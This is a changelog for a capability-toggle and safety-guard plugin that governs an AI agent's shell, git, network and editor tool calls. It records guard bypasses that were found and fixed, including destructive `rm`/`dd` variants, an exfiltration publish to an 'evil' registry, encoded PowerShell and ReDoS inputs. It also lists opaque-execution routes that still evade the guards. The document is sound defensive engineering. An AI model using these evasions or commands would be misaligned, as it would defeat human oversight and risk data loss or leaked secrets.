# Changelog

All notable changes to this project are documented here.

The project follows [Semantic Versioning](https://semver.org/).

## [1.5.0] - 2026-09-19

### Added

- **Plugin-owned blocking confirmation channel.** A new `confirm/stream` SSE
  endpoint and `confirm/respond` POST route give the safety guards a
  confirmation path that does not go through the approval service at all. Every
  guard match is pushed to the browser as a card showing the full command and
  the guard's reason, and the `tools/pre-execute` listener BLOCKS until the user
  answers: `Allow once` releases the call through `next()` (so later listeners
  and the registry's own monotonic guards still run), `Deny` blocks it.

  This exists because the native `ask` decision is unusable under the
  `danger-full-access` permission preset: `ApprovalService.decide()` returns
  `rejected` the instant the session's effective policy is `never` — BEFORE the
  `approval/request` waterfall is dispatched — so no prompt is ever shown and
  the model just sees `the user rejected tool "bash"`. The plugin's own channel
  is independent of that policy. Verified against `dsh-user-approval` and
  `dsh-permission-presets` sources, and against a durable session log where six
  `approval/asked` → `approval/decided{rejected}` pairs landed 0–1 ms apart.

  - The card renders the **full** shell command verbatim (a truncated command
    could hide the dangerous suffix being approved); non-shell arguments are
    bounded because a `write` call can carry a whole file body.
  - The card is mounted in the composer row regardless of whether the toggle
    panel is open, and it reconnects: the stream sends an authoritative
    `{ snapshot }` frame on every subscribe, so a dropped connection or a second
    tab cannot leave a ghost card or a stuck call.
  - Waiting is unbounded by design; only the call's own `AbortSignal` (turn
    aborted) or plugin unload resolves it, and both resolve to `deny` — never to
    consent.
  - With no browser subscribed for the session (headless, or the panel never
    opened) the guard falls back to its previous decision (`deny` stays `deny`,
    `ask` stays `ask`), so a headless turn can never hang on a prompt that
    cannot arrive.

- **Authentication, origin, and CSRF protection on the new routes.** Named
  `webServer` routes bypass the `/api` RPC channel and the static fallback's
  authentication, so this plugin now applies
  `connection.requestRejection(req)` itself on every route it owns — including
  the pre-existing `/state`, `/set`, and `/set-many` — and fails closed with
  `503` when that seam is absent or returns an unrecognized value (the older
  runtime must be upgraded rather than served unauthenticated). The SSE stream
  additionally checks `Origin`/`Sec-Fetch-Site` against its own origin, and
  every POST route requires a `content-type` whose media type is exactly
  `application/json`.

### Fixed

Seven verified guard bypasses, each reproduced against `evaluateGuards` before
being fixed and pinned by a test:

- `protect-secrets` never looked at `grep`'s `include` or `glob`'s `pattern`,
  so `grep {pattern, include:'.env'}` read secret file CONTENTS while the guard
  rendered as active; it also matched secret names case-sensitively, so on
  Windows `cat .ENV` passed for a file Windows considers identical to `.env`.
- `dangerous-shell` missed `rm --recursive --force`, `rm --force`, and the
  uppercase `rm -RF` (the arm only accepted lowercase clustered short flags).
- `dangerous-shell` missed `dd of=/dev/sda if=/dev/zero`: putting `of=` first
  hid a raw disk write from the ask preset (only `readonly`'s broader arm saw it).
- `no-destructive-git` missed `git push --mirror`, `git push origin --delete`,
  and any push behind a global option (`git -C /repo push --force`), because the
  pattern required `git` and `push` to be adjacent.
- `no-network` missed `npm --registry=http://evil publish` — the exfil path to
  an attacker registry — for the same adjacency reason.
- `dangerous-shell` missed PowerShell parameter abbreviations
  (`Remove-Item -Re -Fo`), which PowerShell resolves to the destructive full
  names.
- `PS_ENCODED` missed the most common real spelling,
  `powershell -ExecutionPolicy Bypass -EncodedCommand`, because its prefix chain
  admitted only valueless flags.

The new instance also had several defects, found by its own hardening tests and
fixed here rather than shipped: the 8000-character truncation above; a
`startsWith('application/json')` prefix match that admitted
`application/jsonp`; an origin check that accepted
`https://127.0.0.1:3080` against an http listener; an auth seam that treated an
unrecognized return value as "admitted" instead of failing closed; route
disposal that left live SSE connections running; and a teardown that skipped its
own listener cleanup and heartbeat when the center ended the sink.

Two adversarial re-reviews then found defects in those very fixes, and they are
worth recording because each was a case of a fix being worse than the bug:

- The auth fix above stored `connection.requestRejection` in a local and called
  it detached. The cordis service proxy only supplies the real receiver when the
  proxy itself is `this`, so the call threw inside the service and the
  fail-closed catch turned EVERY request into a 503 — including authenticated
  same-origin ones — which silently reduced the whole confirmation channel to
  the legacy decision. It is now called through the service object. (This is the
  one finding that would have shipped a dead feature behind a green suite; the
  tests missed it because their stubs were plain arrow functions on bare
  objects, so a class-shaped stub is now one of them.)
- The first ReDoS fix bounded the gap with `{0,200}?`. That cured the
  backtracking but FAILED OPEN: the distance from a command to its flag is
  unbounded, so `dd` + 250 characters + `of=/dev/sda` and `Remove-Item` + 250
  spaces + `-Recurse` stopped matching. A token-scan gap then replaced it, which
  was quadratic instead — `'rm a '.repeat(n)` reached 183 ms at 60k tokens and
  144 s on the raw pattern at 128k, a synchronous stall on the shared event loop
  that `try/catch` cannot catch because a slow regex is not a throw.
- The false-positive fix for `rm`/`dd` matching as an ARGUMENT (`ls rm foo -rf`)
  was first implemented as a bare command-position anchor, which a reviewer
  measured as losing `sh -c "rm -rf /"`, `env rm -rf /`, `x=1 rm -rf /`,
  `nohup rm -rf /` and `command rm -rf /` — every one of which the released
  pattern caught. (A later round showed the anchor lost 34 commands in total, so
  it was reverted — see below.)
- `git push ` repeated 8000 times cost 326 ms through `GIT_PREFIX`; the arm
  bodies (`[^\n|&;]*`) were themselves unbounded and are now bounded too.

- A third review round then found that the anchoring fix itself was the worst
  defect of the release: it moved `find . -exec rm -rf {} +`, `ls | xargs rm -rf`,
  `sudo -u root rm -rf /var`, `/bin/rm -rf /`, `nice rm -rf /`, `timeout 30 rm -rf
  /data`, `env -i rm -rf /` and the `for`/`if`/`!` keyword forms out of the anchor
  — 34 commands the released pattern flagged became silent allows, a coverage
  REGRESSION in a safety control. The anchor was reverted entirely. A lexical
  matcher cannot separate `xargs rm` (an executor) from `ls rm` (a file named
  `rm`), so it now errs toward asking: `ls rm foo -rf` costs a confirmation
  prompt, which is strictly better than missing a delete. That trade is pinned by
  a test naming the commands that must keep matching.
- The same round found two quadratic patterns the suite could not see because it
  only exercised `dangerous-shell`. `READONLY_SHELL_WRITE`'s `dd … of=` scan was
  unbounded (5059 ms on a 192 KB `dd`-token flood, newly reachable on pwsh), and
  the new `PS_READONLY_WRITE` had four adjacent `[ \t]*` groups that made an
  indented plain command quadratic — 13.9 s at 4000 leading spaces and over
  185 s at 8000, a synchronous stall of the event loop every agent and the Web
  GUI share. The `dd` scan is now bounded, and `shellCommandMatches` collapses
  horizontal whitespace runs before matching (verified verdict-preserving across
  1400 inputs); the attack drops from 22 s to 0.02 ms. The ReDoS tests now cover
  every shell guard, not just `dangerous-shell`.

The remaining deliberate trade: the gap is bounded at 8000 characters, so a
dangerous flag more than 8000 characters after its command name is not seen.
That is strictly more coverage than the released pattern, which required the
flag immediately after the name and matched no gap at all
(`rm --no-preserve-root -rf /` was already a miss). The bound is load-bearing on
a separator-free run of command names, where it is linear (10k/20k/40k →
111/235/476 ms) and the unbounded form is quadratic (471/1772/6908 ms); a slope
assertion in the test suite discriminates the two.

One behaviour change: PowerShell's long write-cmdlet names are now anchored to a
command position, so `Get-Help New-Item`, `Get-Command Export-Csv`,
`Select-String -Pattern New-Item` and `Write-Host "use Out-File"` are no longer
hard-denied. That gives up consistency with the bash side (where `echo "tee x"`
still denies on an unanchored match) in exchange for not blocking an ordinary
read. Every real write route stays denied — an assignment, the call operator,
a subexpression, a pipeline, and a statement position are all still caught.

A fifth round found the two most serious defects of the whole release, both in
work done to satisfy earlier rounds:

- `PS_ENCODED`'s option chain had an AMBIGUOUS alternation — a valued option's
  value could also parse as the next option — so `pwsh -ExecutionPolicy -x -x -x …`
  backtracked exponentially: ~570 bytes of command stalled the shared event loop
  for 15 s through the real `evaluateGuards`, and the guards' `try/catch` cannot
  catch a slow regex. A disambiguating guard on the option value removes it
  (measured 15.8 s → 0 ms on the same input).
- Narrowing the gap class from `\s` to `[^\n;|&]` had made `rm\n-rf /` and
  `git\rpush\r--force` silent ALLOWS where the released version asked — a
  fail-open in a safety control, the worst direction for one. The gap now admits
  every whitespace character, and the 300-character `dd … of=` window that lost
  the deny past 290 filler characters was widened to 2000.

Tests went from 197 to 334.

### Not in this release

Opaque execution remains open and is deliberately **not** claimed as fixed:
`bash ./x.sh`, `source`, `pwsh -File`, `& .\x.ps1`, dot-sourcing, `eval`,
`iex`, `cmd /c`, and interpreter-run scripts all still pass every guard, because
a lexical matcher cannot see inside a file or a dynamically built string. A
conservative "confirm any opaque execution" preset is the intended follow-up;
shipping it without measuring its false-positive rate would make the guards
noisy enough to be turned off.

### Changed

- All five safety guards route through the confirmation channel when a browser
  channel exists, which makes their behavior independent of `/permission`.

## [1.4.0] - 2026-09-12

### Fixed

- **The `no-network` guard never intercepted `web_fetch`.** Its direct-network
  tool set was `new Set(['web_search', 'read_page'])`, but no DSH release has
  ever registered a tool named `read_page`: `dsh-tool-web` registers `web_search`
  and `web_fetch` (verified in the installed 0.1.5-rc.2 packages, and in the
  0.1.1-rc.2 and 0.1.2-rc.1 tarballs pulled from npm — the same two names in
  all three). The guard row still rendered as ACTIVE and still counted hits,
  while every URL fetch ran without a confirmation prompt. This is a fail-open
  in a safety control, the worst direction for one. The set now names
  `web_fetch`. The name came from a remembered API rather than a read one; two
  tests now pin every tool name the guards list to the registered DSH set and
  reject `read_page` if it reappears.

- **All five shell-content guards ignored `pwsh`.** Every content-inspecting
  preset gated on `name === 'bash'`, but `pwsh` is a registered tool
  (`dsh-tool-pwsh`; `dsh-tool-pwsh-persistent` registers the same `pwsh` name)
  that carries PowerShell source in the same `command` parameter. A model running
  under a Windows profile could bypass every shell guard by using PowerShell
  instead of bash — including `dangerous-shell`, `protect-secrets`, and
  `no-network`. The five call sites
  now share one `SHELL_TOOLS = ['bash', 'pwsh']` gate through a single
  `shellCommandMatches()` helper, so the presets cannot drift apart on which
  shell they cover again; a test asserts no preset reintroduces a bare
  `name === 'bash'`. PowerShell-specific patterns were added where PowerShell
  spells a dangerous action differently (`Set-Content`/`Out-File`/`New-Item`
  writes, `Remove-Item -Recurse -Force`, `Format-Volume`, `Clear-Disk`,
  `Stop-Computer`, `Invoke-WebRequest`/`Invoke-RestMethod`/`Start-BitsTransfer`);
  commands both shells share (git, curl, npm publish) match through the existing
  patterns on either tool. `SECRET_PATH` now also accepts `\` as a path
  separator, since a PowerShell command carries native Windows paths
  (`$env:USERPROFILE\.aws\credentials`).

- **`readonly` blocked reading a file through `str_replace_editor`.** That tool
  is one registration whose `command` parameter selects the action (enum:
  `view`, `create`, `str_replace`, `insert`), and denying it by name also denied
  its read-only `view` — so read-only mode stopped the model from inspecting a
  file through the editor, the opposite of the preset's purpose. It is now
  judged per command: `view` passes, the three mutating commands deny, and an
  absent, empty, or unrecognized `command` denies rather than passing, because a
  safety preset must not widen when it cannot classify a call. The set also
  listed a standalone `create` tool that does not exist in any DSH release
  (`create` is only that enum value), so it matched nothing.

- The guard descriptions in both panel languages advertised the same phantom
  `read_page` name and the same bash-only scope, so the UI told users the guard
  covered things it did not. Both dictionaries now name the real tools and both
  shells, and a test asserts the descriptions cannot reintroduce `read_page`.

Two aliases were deliberately left UNmatched after checking PowerShell's own
`InitialSessionState.cs`: `sc` maps to `Set-Content` only under `#if !CORECLR`
and `ac` only under `#if !UNIX`. The `pwsh` tool prefers PowerShell 7 (Core,
where neither alias exists) but `resolvePwshPath` falls back to
`SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe` — Windows PowerShell
5.1, which is NOT CoreCLR and DOES register `sc` → `Set-Content` — and an
explicit `pwshPath` config is trusted as-is. So on a 5.1 host `sc a b` writes a
file that readonly will not catch; that bypass is accepted deliberately, not
overlooked. Matching `sc` on the PowerShell 7 path would deny `sc query spooler`
(the real read-only service-control program) and matching `ac` on Linux/macOS
would deny the native connect-time accounting command, also read-only. Both are
non-recoverable DENY-path false positives traded against a bypass that needs a
5.1 host to reach. A test records the tradeoff, including the 5.1 caveat.

The PowerShell patterns match cmdlet names unanchored, consistent with the
pre-existing bash patterns (`echo "tee x"` and `# sed -i f` have always been
denied by `readonly`). Anchoring names to a statement position was tried first
and rejected: it produced verified fail-opens that a real model reaches —
`$x = Set-Content a b`, `& "Set-Content" a b`, `$(Out-File a)`,
`Get-Process | Set-Content a` all slipped through. The tradeoff is a cheap false
positive when a cmdlet name appears inside quoted text, which is the tradeoff the
bash side already made. Only the SHORT aliases keep a statement anchor
(`ni`/`clc`/`epcsv` for writes, `rm`/`del`/`ri`/`rmdir`/`erase`/`rd` for
deletes), since those are the names short enough to collide with ordinary
identifiers or flag text — `$ni = 1` must not be denied, and `Remove-Variable
del -Force` must not be read as a delete. That anchor admits `=` so the
assignment-RHS shape is covered for short and long names alike. The distinctive
long names stay unanchored. Word boundaries mean `\brm\b` does not match inside
`rmdir`, so each alias is listed explicitly; the alias set was checked against
PowerShell's own `InitialSessionState.cs` alias table.

Deletion cmdlets stay flag-qualified — `Remove-Item` and its aliases need
`-Recurse` or `-Force` — so a plain single-file delete passes on both shells,
matching `rm file.txt` on bash. The flag gap accepts a PowerShell backtick line
continuation, so a delete split across lines with a trailing backtick is still
caught.

Each shell now sees only its own syntax patterns. The five presets previously
shared one flat pattern list through `shellCommandMatches()`, which applied the
PowerShell patterns to bash calls too: `grep -rn "Set-Content" CHANGELOG.md` was
hard-denied by `readonly`, and those very strings are documented in this
CHANGELOG. The helper takes a per-shell map instead. Patterns for shell-agnostic
external commands (`tee`, `sed -i`, `dd`, `mkfs`, `chmod 777`, `curl|sh`) are
still shared with `pwsh`, because PowerShell runs those programs too — scoping
them to bash alone was verified to open seven fail-opens, including `tee
out.txt` and `dd if=/dev/zero of=/dev/sda` on the DENY path.

`pwsh -EncodedCommand <base64 UTF-16LE>` hides its payload from every
content-inspecting preset, including the two DENY ones, so `protect-secrets`
could be exfiltrated as an unreadable blob. The bash analogue
(`echo <b64> | base64 -d | bash`) was already caught by the `| bash` arm,
leaving pwsh strictly weaker. The evasion vector itself is now confirmed on the
pwsh path rather than pretending to decode the payload. The pattern matches a
prefix chain of `-e`/`-en`/…/`-EncodedCommand` directly on the `pwsh` or
`powershell` executable, so it catches the abbreviated forms too; an open
`-e[a-z]*` tail was rejected because it fired on `-eq` (the equality operator),
`-ErrorAction`, `-Encoding`, and `-ea`, which are ubiquitous and would have asked
on ordinary PowerShell. The flags are required to follow the executable, so an
`-eq` inside a `-Command "…"` string does not match.

Tests went from 173 to 197.

### Changed

- `readonly` no longer denies `str_replace_editor` calls whose `command` is
  `view`. A session that had turned the preset on to stop edits also stops
  editor-based reads from now on being blocked; every mutating command is still
  denied.

### Install

```bash
dsh plugin --profile web add github:lifeopsgo/dsh-capability-toggle-plugin#v1.4.0
```

## [1.3.2] - 2026-09-12

### Fixed

- The declared `@deepseek-ai/dsh-*` peer ranges did not admit the 0.1.5
  prereleases under strict semver. npm now publishes `next` as 0.1.5-rc.2 and
  `alpha` as 0.1.5-alpha.2, and a prerelease satisfies a range only when some
  comparator names a prerelease of the *same* `major.minor.patch` tuple — so the
  highest anchor v1.2.1 shipped (`>=0.1.3-0`) admits 0.1.3-alpha.x but not
  0.1.5-rc.x. This is the v1.2.1 rule recurring on a tuple that did not exist when
  any earlier release was cut.

  No install actually broke. Both real installers — pnpm, which `dsh plugin add`
  shells out to, and npm — resolve peers prerelease-leniently and accepted the old
  range silently against a real 0.1.5-rc.2 host: `pnpm peers check` reported no
  issues, and even `pnpm install --strict-peer-dependencies` exited 0, while a
  deliberately-wrong `^0.2.0` peer on the same host did raise
  `ERR_PNPM_PEER_DEP_ISSUES`. So this is manifest hygiene, not a bug users hit. A
  `>=0.1.5-0` anchor now admits the whole 0.1.5 prerelease line, which makes the
  declared range correct under strict semver — the semantics this repo's own
  peer-range contract test asserts — and keeps that test green; without the anchor
  `every DSH peer range admits the prereleases users actually run` fails on
  0.1.5-rc.2. No `>=0.1.4-0` anchor was added: npm never published a 0.1.4 (the line
  went 0.1.3 → 0.1.5), so it would admit nothing. 0.2.0 and later stay rejected.

  No code changed: both the Host and Client faces typecheck and build against real
  0.1.5-rc.2 packages. A symbol-by-symbol diff of every DSH surface this plugin
  consumes shows seven of the eight byte-identical to 0.1.1 (`createScope`, `scopeOf`,
  `tools/pre-execute`, `tools/result`, `PreToolDecision`, `ApprovalOutcome`,
  `session.header.cwd`). The eighth, `approval/request`, did change: its receiver
  narrowed `Scoped<ApprovalService>` → `Scoped<Agent>` and its payload renamed
  `ApprovalRequest` → `ApprovalRequestEvent`. Neither change reaches this plugin, for
  two independent reasons. First, the listener is `() => Promise.resolve('rejected')`
  and reads neither the receiver nor the payload. Second, and more load-bearing for a
  safety gate, the dispatch routing is unchanged: `scopeTarget`'s implementation is
  byte-identical, both versions route on the same key (`req.agent` — only the unused
  `base` argument moved, from `this` to `req.agent`), and neither base carries a
  `Context.filter`, so the auto-reject still fires on the same agent-scoped context.
  The gate keeps auto-rejecting approvals exactly as before.

### Install

```bash
dsh plugin --profile web add github:lifeopsgo/dsh-capability-toggle-plugin#v1.3.2
```

## [1.3.1] - 2026-09-12

### Fixed

- The search box could be opened but not typed into while an agent was running.
  The input carried the panel's running lock (`disabled={disabled}`, which
  `index.tsx` feeds from `running`), yet the disclosure button that reveals it never
  did, so clicking the magnifier opened a field that ignored every keystroke —
  greyed out at half opacity. The lock exists because a stance write cannot be
  applied mid-turn, but search is a local filter over rows already in hand: it never
  reaches the Host, so it now stays usable, and a projection refresh triggered by
  the agent finishing keeps the typed query. Every control that does write — each
  row's per-level switches, their clear badges, and the bulk menus — stays locked
  exactly as before. **This affected every release from v1.1.0, which introduced the
  search toolbar, through v1.3.0.**

### Added

- Render-level tests for the popup (`test/panel-render.test.ts`), which mount the
  real component without a DOM and drive it the way a browser would: the harness
  refuses to dispatch a user event to a disabled control, so a re-locked search box
  fails the filtering test instead of passing vacuously. One sentinel test carries no
  skip guard, so a React major bump that removes the hook dispatcher fails loudly
  rather than skipping the whole suite green. Tests went from 164 to 173.

### Install

```bash
dsh plugin --profile web add github:lifeopsgo/dsh-capability-toggle-plugin#v1.3.1
```

## [1.3.0] - 2026-09-09

### Added

- Fraction-format tab counts. Each tab badge now renders as `enabled / total`
  (`67/106`) instead of a bare total, so the strip reports at a glance how much of
  each family is active. The hover tooltip states both numbers in words whether or
  not the fraction is shown. A guard counts as enabled only while it is ACTIVE: a
  guard row reuses `disabled` to mean active, the inverse of every default-on
  family, so a Security tab with the approval gate open and all five guards
  inactive reads `1/6` rather than `6/6`.
- A preferences drawer behind a disclosure arrow beside the panel title, holding
  three display preferences: show the `enabled / total` fraction, show the per-row
  usage badge, and choose which level columns the grid shows (Session, Session +
  Project, or all three). Preferences persist in `localStorage`, so they survive
  page reloads and browser restarts; a throwing or absent storage degrades to the
  defaults instead of taking the composer down.

### Changed

- Narrowing the level columns is display-only. The three-level resolution keeps
  running exactly as before, so a hidden project or global override still applies,
  and each row's badge and level switches still reflect the resolved state — hiding
  a column cannot hide an effect.
- The row grid is now driven by CSS variables instead of a build-time template
  constant. `.dshct-panel` derives its column template from
  `repeat(var(--dshct-lv-n), var(--dshct-lv-w)) var(--dshct-badge-w)`, and the
  component sets `--dshct-lv-n` from the visible-level count. This also removes the
  narrow-screen media query's hardcoded duplicate of the whole template
  (`grid-template-columns:1fr repeat(3,40px) 42px`): that rule now narrows the two
  width variables only — and keeps its pre-existing gap and padding overrides — so
  the column header, row, and toolbar grids stay aligned at any column count.
- The tab identity set and its tab→kind mapping moved from the component file into
  `src/client/tabs.ts`, together with the new count and visible-level helpers, so
  row filtering, the per-tab counts, and the tab strip read one source and cannot
  drift.
- Tests went from 149 to 164.

### Install

```bash
dsh plugin --profile web add github:lifeopsgo/dsh-capability-toggle-plugin#v1.3.0
```

## [1.2.1] - 2026-09-08

### Fixed

- The composer control crashed on DSH 0.1.2 and later. The `conversation.input.left`
  slot's owner share stopped carrying a `session` snapshot object (the owner now
  renders the slot with an empty share), and the session identity moved to the
  framework's standard props: a plain `sessionId` plus a `useSession` selector hook.
  Every release up to and including v1.2.0 read `props.session.sessionId`
  unconditionally, so mounting the control threw a `TypeError` and took the whole
  composer down. Both reads now go through `sessionIdOf` / `runningOf`, which take
  the legacy snapshot when a host supplies one and the framework seats otherwise, so
  one build serves 0.1.1 through 0.1.3. **v1.2.0 is broken on DSH 0.1.2; upgrade to
  this release.**
- The declared `@deepseek-ai/dsh-*` peer ranges rejected the prereleases people
  actually install. `>=0.1.1-rc.0 <0.2.0-0` looks like it spans 0.1.x, but semver
  admits a prerelease only when a comparator names a prerelease of the *same*
  `major.minor.patch` tuple — so `0.1.2-rc.1` (npm's `next`) and `0.1.3-alpha.x`
  (npm's `alpha`) both failed to satisfy it, and a host on either would warn or
  refuse the install. Each tuple now has its own `>=0.1.N-0` anchor, which admits
  `0.1.2-rc.1`, `0.1.3-alpha.1`, and `0.1.3-alpha.2` while still rejecting
  everything at or above `0.2.0`.

### Removed

- `@deepseek-ai/dsh-client-runtime`, from `dsh.client.inject`, `peerDependencies`,
  and `devDependencies`. No source file imports it, and the package no longer exists
  in current DSH — it had been deleted upstream, so declaring it made installs
  resolve a stale copy and named a module the host no longer ships.
- Two dead entries from the client build's platform-module table
  (`@deepseek-ai/dsh-client-web-react`, `@deepseek-ai/dsh-client-schema-form`). Both
  packages are gone from current DSH and no source file requests them, so listing
  them only risked a loader-table mismatch. The emitted `lib/client.js` is
  byte-identical before and after the removal.

### Install

```bash
dsh plugin --profile web add github:lifeopsgo/dsh-capability-toggle-plugin#v1.2.1
```

## [1.2.0] - 2026-09-08

### Added

- Capability invocation stats. Skills, MCP servers, and tools now carry a badge
  showing how many times the model called them this session (`called 7`), with the
  exact count in the hover tooltip. The tally observes `tools/result`, attributes
  each call to a row (a `skill` call credits the named skill rather than the loader,
  and `mcp__server__member` credits the server group), and rides only the callable
  families — guards keep their own `matched N` badge, and prompt/approval rows show
  neither. Counts live for one agent's lifetime and are never persisted, matching
  the retention guards already had.

### Fixed

- Compatibility with DSH 0.1.2. That release removed the `settingsNamespace` factory
  from `@deepseek-ai/dsh-settings`, and v1.1.0 imported it by name — an ESM named
  import of a missing export fails at link time, which stopped the plugin from
  loading at all. The namespace is now passed as a plain string with a type-only
  import, which works on 0.1.1 and 0.1.2 alike. **v1.1.0 is broken on DSH 0.1.2;
  upgrade to this release.**

### Changed

- The row name's ellipsis rule moved from a `>span:last-child` selector to an
  explicit `.dshct-row-text` class. Appending the usage badge after the name moved
  `:last-child` onto the badge, which would have silently dropped the name's
  truncation.
- `.temp/` is now gitignored, so scratch artifacts can no longer reach the repository.

### Install

```bash
dsh plugin --profile web add github:lifeopsgo/dsh-capability-toggle-plugin#v1.2.0
```

## [1.1.0] - 2026-09-02

### Added

- A search toolbar that filters the current capability tab by name or description.
- One bulk-action dropdown per level column. Enable all, disable all, or clear all applies
  to the rows currently visible after filtering.

### Changed

- Bulk actions use one 28×28 px dropdown trigger per level column and 32 px menu rows,
  meeting the WCAG 2.5.8 target-size floor. At most one menu is expanded at a time;
  clicking outside or pressing Escape closes it, and switching tabs, toggling the search
  row, or scrolling closes any open menu. Menu items reuse the ✓/✕/– glyph language of
  the per-row switches, with state color limited to each glyph so labels remain neutral.

### Install

```bash
dsh plugin --profile web add github:lifeopsgo/dsh-capability-toggle-plugin#v1.1.0
```

## [1.0.3] - 2026-08-31

### Fixed

- Project-level skills were silently missing from the Skills tab. `collectInventory` called
  `ctx.skills.snapshot()` without the agent's session `cwd`, so `dsh-skill-filesystem` never
  scanned `<projectRoot>/.dsh/skills` or `<projectRoot>/.agents/skills` — only user (`~/.agents`)
  and bundled skills showed up. The model-facing skill catalog (`dsh-tool-skill`) already reads
  `session.header.cwd`, so a project skill the model could see and load was invisible on this
  panel and could never be switched off. `collectInventory` and `AgentBinding.pristineInventory`
  now forward the session `cwd`, matching the model-facing catalog.

### Install

```bash
dsh plugin --profile web add github:lifeopsgo/dsh-capability-toggle-plugin#v1.0.3
```

## [1.0.2] - 2026-08-27

### Fixed

- `package.json` reported `0.1.0` on every release up to and including `v1.0.1`. The
  installed version is user-visible through the plugin market's update view, which reads
  the manifest in the profile's `node_modules`, so the reported version now matches the
  tag. No runtime code changed; the built bundles never embedded the version string.

### Changed

- README install commands reference `v1.0.2`.
- `CHANGELOG.md` documents the `1.0.0` and `1.0.1` releases, which were tagged without
  entries.

### Install

```bash
dsh plugin --profile web add github:lifeopsgo/dsh-capability-toggle-plugin#v1.0.2
```

## [1.0.1] - 2026-08-27

### Fixed

- Silent enforcement degradation is now detectable. When the plugin reads an agent context
  through a *duplicate* copy of `@deepseek-ai/dsh-scope`, `scopeOf()` returns `undefined`:
  per-agent enforcement stops applying and the panel's skills tab collapses to globally
  registered skills only, with no error anywhere. That failure is now reported through the
  existing warn-once drift channel, naming both the cause and the fix. `dsh-agent-loop`
  mints a scope for every agent, so a missing scope tag is always a duplicate-copy fault
  and never a legitimate state.

### Added

- `pnpm run link-host-framework`, an idempotent maintenance script that re-points
  `node_modules/@deepseek-ai/*` at the running host's copy. `--check` reports without
  writing, for use in a local gate or pre-commit hook.
- `CONTRIBUTING.md` documents when the script is required: after any install in a checkout
  a DSH profile consumes through `link:`, because a profile `link:` is resolved by realpath
  and the plugin would otherwise load its own second copy of the framework.

### Notes

- Enforcement behavior is unchanged and no per-call cost is added. Installs made with
  `dsh plugin add` were never affected by the underlying fault: DSH pins
  `autoInstallPeers: false` for every profile and `pnpm add` skips a plugin's
  `devDependencies`, so no duplicate framework copy is created. The fault reproduces only
  in a checkout linked into a live profile.

## [1.0.0] - 2026-08-25

Repository and toolchain maturity only. No runtime code changed relative to `0.1.0`; the
Host and client bundles are byte-identical.

### Added

- CI workflow running install, typecheck, tests, and build on push and pull request.
- Framework packages declared as `peerDependencies` so they resolve to the running host's
  copy, with matching `devDependencies` so a clean checkout can typecheck.
- Contribution, security, support, and code-of-conduct guides; issue forms and a pull
  request template; Dependabot configuration; editor configuration.

### Changed

- Toolchain versions: `pnpm/action-setup` 4 to 6, `actions/checkout` 4 to 7,
  `actions/setup-node` 4 to 7, TypeScript 5.9.3 to 7.0.2.
- Both READMEs condensed to introduction, quick start, and features.

## [0.1.0] - 2026-08-22

### Added

- DSH WebUI composer control for managing six capability families: skills, MCP servers, tools, prompt injections, approval escalation, and safety guards.
- Session-, project-, and global-level overrides with session-first precedence and an explicit unset/inherit state.
- Scoped enforcement that removes disabled tools and skills from the model-visible capability surface and rejects forced calls.
- Five opt-in safety guards: read-only mode, secret-file protection, dangerous-shell confirmation, destructive-git confirmation, and outbound-network confirmation.
- Bilingual English and Simplified Chinese interface and documentation.
- Responsive, centered capability panel with per-row resolved status, MCP member-tool expansion, and idle-only editing.
- Persistent settings with last-known inventory fallback so state remains visible across agent turn boundaries.
- Prebuilt Host and client bundles for tag-based installation without an install-time build step.

### Install

```bash
dsh plugin --profile web add github:lifeopsgo/dsh-capability-toggle-plugin#v0.1.0
```

[1.3.2]: https://github.com/lifeopsgo/dsh-capability-toggle-plugin/releases/tag/v1.3.2
[1.3.1]: https://github.com/lifeopsgo/dsh-capability-toggle-plugin/releases/tag/v1.3.1
[1.3.0]: https://github.com/lifeopsgo/dsh-capability-toggle-plugin/releases/tag/v1.3.0
[1.2.1]: https://github.com/lifeopsgo/dsh-capability-toggle-plugin/releases/tag/v1.2.1
[1.2.0]: https://github.com/lifeopsgo/dsh-capability-toggle-plugin/releases/tag/v1.2.0
[1.1.0]: https://github.com/lifeopsgo/dsh-capability-toggle-plugin/releases/tag/v1.1.0
[1.0.3]: https://github.com/lifeopsgo/dsh-capability-toggle-plugin/releases/tag/v1.0.3
[1.0.2]: https://github.com/lifeopsgo/dsh-capability-toggle-plugin/releases/tag/v1.0.2
[1.0.1]: https://github.com/lifeopsgo/dsh-capability-toggle-plugin/releases/tag/v1.0.1
[1.0.0]: https://github.com/lifeopsgo/dsh-capability-toggle-plugin/releases/tag/v1.0.0
[0.1.0]: https://github.com/lifeopsgo/dsh-capability-toggle-plugin/releases/tag/v0.1.0
